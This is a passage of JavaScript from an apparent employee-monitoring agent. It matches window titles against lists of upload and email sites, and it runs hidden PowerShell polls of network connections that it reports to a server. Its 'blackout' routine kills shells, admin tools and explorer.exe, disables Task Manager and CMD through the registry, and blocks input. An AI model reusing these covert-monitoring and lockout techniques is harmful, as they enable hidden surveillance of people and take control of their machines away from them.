    "A": "41", "B": "42", "C": "43", "D": "44", "E": "45", "F": "46", "G": "47", "H": "48", "I": "49", "J": "4A",
    "K": "4B", "L": "4C", "M": "4D", "N": "4E", "O": "4F", "P": "50", "Q": "51", "R": "52", "S": "53", "T": "54",
    "U": "55", "V": "56", "W": "57", "X": "58", "Y": "59", "Z": "5A",
    "F1": "70", "F2": "71", "F3": "72", "F4": "73", "F5": "74", "F6": "75", "F7": "76", "F8": "77", "F9": "78", "F10": "79", "F11": "7A", "F12": "7B",
    ";": "BA", "=": "BB", ",": "BC", "-": "BD", ".": "BE", "/": "BF", "`": "C0", "[": "DB", "\\": "DC", "]": "DD", "'": "DE"
};

// (All socket command handlers are now in bindSocketHandlers above)



// ═══════════════════════════════════════════════
// PHASE 3: NETWORK SENTINEL — Cloud, Email, Upload Detection
// ═══════════════════════════════════════════════

// Data transfer site patterns (domain fragments detected in window titles or DNS)
const DATA_TRANSFER_SITES = {
    // Email services
    email: ["gmail", "outlook.com", "outlook.live", "mail.yahoo", "protonmail", "zoho.com/mail", "mail.google", "hotmail", "aol.com/mail", "yandex.mail", "thunderbird", "mailspring"],
    // Cloud storage
    cloud: ["drive.google", "onedrive.live", "dropbox.com", "icloud.com", "box.com/", "mega.nz", "pcloud.com", "sync.com", "mediafire", "4shared", "zippyshare"],
    // File sharing / upload
    upload: ["wetransfer", "sendspace", "file.io", "gofile.io", "transfer.sh", "temp.sh", "catbox.moe", "filebin", "uploadfiles", "filedropper", "bayfiles", "anonfiles", "pixeldrain"],
    // Code repos (data exfiltration via code)
    code: ["github.com", "gitlab.com", "bitbucket.org", "pastebin.com", "hastebin", "rentry.co", "dpaste", "ghostbin", "codepen.io"],
    // Social media (data sharing)
    social: ["facebook.com", "twitter.com", "linkedin.com", "reddit.com", "instagram.com", "discord.com", "telegram.org", "slack.com", "whatsapp"],
    // Messaging web apps
    messaging: ["web.whatsapp", "web.telegram", "teams.microsoft", "discord.com/channels", "chat.google"],
};

// Flatten all patterns for quick matching
const ALL_TRANSFER_PATTERNS = Object.entries(DATA_TRANSFER_SITES).flatMap(([cat, patterns]) =>
    patterns.map(p => ({ pattern: p.toLowerCase(), category: cat }))
);

let lastDetectedSite = "";
let lastNetworkScan = 0;
let reportedConnections = new Set();

// Monitor window titles for cloud/email/upload sites & policy violation categories
function checkDataTransferSites(windowTitle) {
    if (!windowTitle) return;
    const lower = windowTitle.toLowerCase();

    // 1. Policy Violation Categories (adult, gambling, piracy, etc.)
    if (agentSettings.trigger_site_categories) {
        const catList = agentSettings.trigger_site_categories.split(",").map(c => c.trim().toLowerCase()).filter(Boolean);
        for (const cat of catList) {
            if (lower.includes(cat)) {
                startTriggerSession("POLICY_VIOLATION_SITE", `Policy Violation Category: ${cat} (in "${windowTitle}")`, 120);
                break;
            }
        }
    }

    // 2. Data Transfer Sites
    for (const { pattern, category } of ALL_TRANSFER_PATTERNS) {
        if (lower.includes(pattern)) {
            const siteKey = `${pattern}-${Date.now() >> 16}`; // dedupe per ~65 seconds
            if (lastDetectedSite === siteKey) return;
            lastDetectedSite = siteKey;

            // Report as DLP incident
            axios.post(`${SERVER_URL}/api/dlp/incidents`, {
                hostname: os.hostname(),
                username: os.userInfo().username,
                incident_type: `Data Transfer Site Detected`,
                channel: category === "email" ? "Email" : category === "cloud" ? "Cloud" : category === "upload" ? "Web Upload" : category === "code" ? "Code Repository" : "Web",
                severity: category === "upload" ? "High" : category === "code" ? "High" : "Medium",
                policy_name: `${category.toUpperCase()} Site Monitor`,
                content_snippet: `User opened: "${windowTitle}" — matched pattern: ${pattern}`,
                action_taken: "Logged",
                risk_score: category === "upload" ? 12 : category === "email" ? 5 : 8
            }).catch(() => { });

            // Start triggered recording session for high-risk transfer site
            if (category === "upload" || category === "code" || category === "cloud") {
                startTriggerSession("POLICY_VIOLATION_SITE", `High-risk site (${category}): ${pattern}`, 120);
            }
            return;
        }
    }
}

// Track network connections per process (stealth netstat polling)
function scanNetworkConnections() {
    // Only scan if memory permits and machine isn't sleeping
    if (Date.now() - lastInputTime > 300000) return;
    try {
        const psCmd = `Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Where-Object { $_.RemotePort -in 80,443,21,22,25,587,993,995,3389 -and $_.RemoteAddress -ne '127.0.0.1' -and $_.RemoteAddress -ne '::1' } | ForEach-Object { $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue; [PSCustomObject]@{ PID=$_.OwningProcess; Process=$proc.ProcessName; Remote=$_.RemoteAddress; Port=$_.RemotePort; Local=$_.LocalPort } } | ConvertTo-Json -Compress`;
        exec(`powershell -NoProfile -WindowStyle Hidden -Command "${psCmd}"`, {
            timeout: 10000, windowsHide: true
        }, (err, stdout) => {
            if (err || !stdout) return;
            try {
                let conns = JSON.parse(stdout.trim());
                if (!Array.isArray(conns)) conns = [conns];

                const newConns = [];
                for (const c of conns) {
                    const key = `${c.Process}-${c.Remote}-${c.Port}`;
                    if (!reportedConnections.has(key)) {
                        reportedConnections.add(key);
                        newConns.push(c);
                        if (reportedConnections.size > 500) {
                            const arr = Array.from(reportedConnections);
                            reportedConnections = new Set(arr.slice(-200));
                        }
                    }
                }

                if (newConns.length > 0) {
                    axios.post(`${SERVER_URL}/api/dlp/network-activity`, {
                        hostname: os.hostname(),
                        username: os.userInfo().username,
                        connections: newConns,
                        timestamp: new Date().toISOString()
                    }).catch(() => { });
                }

                // Hint to GC to run after powershell processing (if exposed)
                if (global.gc) global.gc();
            } catch (e) { }
        });
    } catch (e) { }
}

// Monitor per-process bandwidth usage
function scanBandwidth() {
    if (Date.now() - lastInputTime > 300000) return;
    try {
        const psCmd = `Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | Group-Object OwningProcess | ForEach-Object { $proc = Get-Process -Id $_.Name -ErrorAction SilentlyContinue; if($proc -and $proc.ProcessName -ne 'Idle') { [PSCustomObject]@{ Process=$proc.ProcessName; PID=[int]$_.Name; Connections=$_.Count; WorkingSetMB=[math]::Round($proc.WorkingSet64/1MB,1) } } } | Sort-Object Connections -Descending | Select-Object -First 15 | ConvertTo-Json -Compress`;
        exec(`powershell -NoProfile -WindowStyle Hidden -Command "${psCmd}"`, {
            timeout: 10000, windowsHide: true
        }, (err, stdout) => {
            if (err || !stdout) return;
            try {
                let procs = JSON.parse(stdout.trim());
                if (!Array.isArray(procs)) procs = [procs];

                axios.post(`${SERVER_URL}/api/dlp/bandwidth`, {
                    hostname: os.hostname(),
                    username: os.userInfo().username,
                    processes: procs,
                    timestamp: new Date().toISOString()
                }).catch(() => { });
            } catch (e) { }
        });
    } catch (e) { }
}

// Hook into the existing window title capture
const _origCheckWindow = checkWindowTitlePolicy;
const checkWindowTitlePolicyWithNetwork = (title) => {
    _origCheckWindow(title);
    checkDataTransferSites(title);
};
// Override — called from the main frame processing loop
if (typeof checkWindowTitlePolicy === 'function') {
    // We'll call checkDataTransferSites directly from the activity sync interval
}

// Network monitoring intervals (all stealth and memory optimized)
setInterval(() => checkDataTransferSites(activeWindowTitle), 4000);  // Check window title every 4s
setInterval(scanNetworkConnections, 120000); // Scan connections every 2m (reduced to save memory)
setInterval(scanBandwidth, 240000);          // Bandwidth every 4m (reduced to save memory)
setTimeout(scanNetworkConnections, 15000);   // First scan after 15s


// USB monitoring intentionally removed (v2 — out of scope)

// ═══════════════════════════════════════════════
// BLACKOUT ENFORCER: Kill ALL escape tools during active blackout
// ═══════════════════════════════════════════════
let blackoutEnforcerTimer = null;

function startBlackoutEnforcer() {
    if (blackoutEnforcerTimer) return;

    // Comprehensive kill list: every tool that could bypass blackout
    const killTargets = [
        // Task managers & system tools
        "taskmgr.exe", "ProcessHacker.exe", "procexp.exe", "procexp64.exe",
        // Command line shells
        "cmd.exe", "powershell.exe", "pwsh.exe", "powershell_ise.exe",
        // Modern terminals
        "wt.exe", "WindowsTerminal.exe", "ConEmu.exe", "ConEmu64.exe",
        "cmder.exe", "Hyper.exe", "terminus.exe", "Alacritty.exe",
        // System config tools
        "msconfig.exe", "regedit.exe", "mmc.exe", "control.exe",
        "SystemSettings.exe", "ComputerDefaults.exe",
        // Scripting engines (can spawn processes)
        "wscript.exe", "cscript.exe", "mshta.exe",
        // System utilities that can be abused
        "sc.exe", "reg.exe", "schtasks.exe", "wmic.exe",
        "certutil.exe", "bitsadmin.exe", "net.exe", "net1.exe",
        // Remote access
        "msra.exe",
        // Accessibility tools (can spawn CMD at login screen)
        "Magnify.exe", "osk.exe", "Narrator.exe", "utilman.exe", "sethc.exe",
        // File explorer (can access Run dialog)
        "explorer.exe"
    ];

    blackoutEnforcerTimer = setInterval(() => {
        // Kill each target process
        killTargets.forEach(proc => {
            exec(`taskkill /F /IM "${proc}" /T`, { windowsHide: true }, () => { });
        });

        // Re-assert registry locks every cycle (in case user managed to undo them)
        exec(`reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f`, { windowsHide: true }, () => { });
        exec(`reg add "HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 2 /f`, { windowsHide: true }, () => { });

        // Re-assert input blocking
        sendInput("BI");
    }, 1500);
}

function stopBlackoutEnforcer() {
    if (blackoutEnforcerTimer) {
        clearInterval(blackoutEnforcerTimer);
        blackoutEnforcerTimer = null;
    }
}

// ═══════════════════════════════════════════════
// NETWORK-READY DETECTION: Wait for active interface before connecting
// ═══════════════════════════════════════════════
function hasNetworkInterface() {
    try {
        const nets = os.networkInterfaces();
        return Object.values(nets).flat().some(n =>
            n.family === "IPv4" && !n.internal && !n.address.startsWith("169.254")
        );
    } catch { return false; }
}

function waitForNetworkThenConnect() {
    if (hasNetworkInterface()) {
        connectWithDiscovery();
    } else {
        console.log("[BOOT] Waiting for network interface...");
        const netCheck = setInterval(() => {
            if (hasNetworkInterface()) {
                clearInterval(netCheck);
                console.log("[BOOT] Network detected! Connecting...");
                connectWithDiscovery();
            }
        }, 2000);
        // Safety: stop waiting after 2 minutes and try anyway
        setTimeout(() => {
            clearInterval(netCheck);
            connectWithDiscovery();
        }, 120000);
    }
}

// ═══════════════════════════════════════════════
// BOOT: Initialize connection (network-ready aware)
// ═══════════════════════════════════════════════
waitForNetworkThenConnect();

// ═══════════════════════════════════════════════
// AUTO-RECONNECT HEALTH LOOP: Aggressive boot phase + steady state
// Boot phase: retry every 5s for first 2 minutes
// Steady state: retry every 30s after that
// Also monitors for stuck discovery state
// ═══════════════════════════════════════════════
let bootPhase = true;
setTimeout(() => { bootPhase = false; }, 120000);

// Boot phase: aggressive reconnect every 5s for first 2 minutes
const bootHealthCheck = setInterval(() => {
    if (!bootPhase) {
        clearInterval(bootHealthCheck);
        return;
    }
    if (!socket || !socket.connected) {
        // Reset discovery guard if stuck
        if (discoveryRunning && (Date.now() - lastDiscoveryStart > 30000)) {
            console.log("[HEALTH] Discovery stuck during boot. Resetting...");
            discoveryRunning = false;
        }
        console.log("[HEALTH] Socket disconnected (boot phase). Reconnecting...");
        connectWithDiscovery();
    }
}, 5000);

// Steady-state health check: every 30s after boot phase
setInterval(() => {
    if (bootPhase) return; // Skip during boot phase (bootHealthCheck handles it)
    if (!socket || !socket.connected) {
        // Reset discovery guard if stuck for >60s
        if (discoveryRunning && (Date.now() - lastDiscoveryStart > 60000)) {
            console.log("[HEALTH] Discovery stuck in steady state. Resetting...");
            discoveryRunning = false;
        }
        console.log("[HEALTH] Steady-state reconnect attempt...");
        connectWithDiscovery();
    }
}, 30000);

// ═══════════════════════════════════════════════
// OFFLINE BLACKOUT ENFORCEMENT: Runs independently of server
// ═══════════════════════════════════════════════
setInterval(() => {
    try {
        
        const blPath = path.join(extractDir, "blackout.dat");
        if (fs.existsSync(blPath)) {
            const blState = fs.readFileSync(blPath, "utf8").trim();
            if (blState && blState !== "0") {
                // Blackout file exists — enforce it locally even if server is unreachable
                sendInput("BI"); // Keep input blocked
                // Re-assert process kills
                if (!blackoutEnforcerTimer) {
                    startBlackoutEnforcer();
                    // Re-send blackout command to ScreenCap
                    if (blState === "1") {
                        sendInput("BL 1");
                    } else {
                        sendInput(`BL 1 ${blState}`);
                    }
                }
            }
        }
    } catch { }
}, 10000);

console.log("[READY] Agent operational.");
